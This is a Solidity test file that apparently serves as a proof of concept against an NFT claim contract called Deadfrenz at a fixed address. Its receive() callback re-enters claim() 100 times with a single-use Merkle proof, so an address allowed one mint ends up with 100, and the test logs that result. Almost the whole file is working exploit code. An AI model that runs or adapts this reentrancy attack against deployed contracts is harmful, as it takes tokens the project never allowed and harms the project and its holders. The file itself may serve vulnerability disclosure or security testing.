// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.6;

import "ds-test/test.sol";

interface Deadfrenz {

    function claim(
        uint256 numPasses,
        uint256 amount,
        uint256 mpIndex,
        bytes32[] calldata merkleProof
    ) external payable;
    
    function balanceOf(address owner, uint256 id) external view returns (uint256);
}

contract DeadfrenzattackTest is DSTest {

    Deadfrenz constant deadfrenz = Deadfrenz(0x090f688f0C11a8671C47d833AF3Cf965c30d3C35);
    bytes32[] merkleProof = new bytes32[](13);

    // This is my Merkle proof. Can't be used by any other address.
    // The sender address is encoded as part of the merkle node, and checked in the call.
    function setUp() public {
        merkleProof[0 ] = 0x16f65545443460f347ccb8028ca5e5a5a81d8640c6bcfdabfa470d4216012538;
        merkleProof[1 ] = 0xa4b6dd90c0722481a650412ee19a2232a0de48651312fc3c29acf4441312a429;
        merkleProof[2 ] = 0xe8078f94638a1654594fca6733cb194e8fb831183e9d842f56cd63c8bfdd7cc2;
        merkleProof[3 ] = 0xf76be65b971fdda491460bf946c04558d74f306bc0e7a897abb0aaeca1cead1c;
        merkleProof[4 ] = 0x781cfc2f2fb8acfc85ff29173dbc528197c2b4b671b19cf39b4a86bd7e9c2d09;
        merkleProof[5 ] = 0x602de031f6e77de516f8dd6e35284c7d526486236fde1abcbc013865bc7fa98b;
        merkleProof[6 ] = 0x4e6522d31b58f566934a9dd24f71439b03ceff518a2793828482570381705b97;
        merkleProof[7 ] = 0x4a84d325ed258355ec0986cad34b01702b2f91026993e036298a8718582c02ea;
        merkleProof[8 ] = 0xa7bdba4915336dbcfc3322ea740aa344c34f65bd5e22e732da14a348933a1724;
        merkleProof[9 ] = 0x1c8dce10fd7813bcc56a447f3fe9a0ca4d1fbd33d12ba3cd8a120084dd622b61;
        merkleProof[10] = 0xcf481ba0d31cb56950227d46b73e018d0836f2de7e405f9e41640f579c8510d1;
        merkleProof[11] = 0x80675db189384580cfa41e8db885b486470734e4e52f01842961e8c9174b75e7;
        merkleProof[12] = 0x0ae9f44dbdf9e3dbb4e7423a887496f300b51a6ee098c51ae1487e00463908fe;
    }
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return 0xf23a6e61;
    }

    uint256 currentAttack;
    uint256 numAttacks = 100;

    receive() external payable {
        currentAttack++;
        if (currentAttack < numAttacks) {
            attack();
        }
    }

    function attack() public {
        emit log_bytes(abi.encode(merkleProof));
        deadfrenz.claim{value: 1 wei}(1, 1, 2, merkleProof);
    }

    function test_attack() public {
        attack();
        assertTrue(deadfrenz.balanceOf(address(this), 2) == numAttacks);
        emit log_string("I'm allowed to mint 1, I minted:");
        emit log_uint(numAttacks);
    }
}
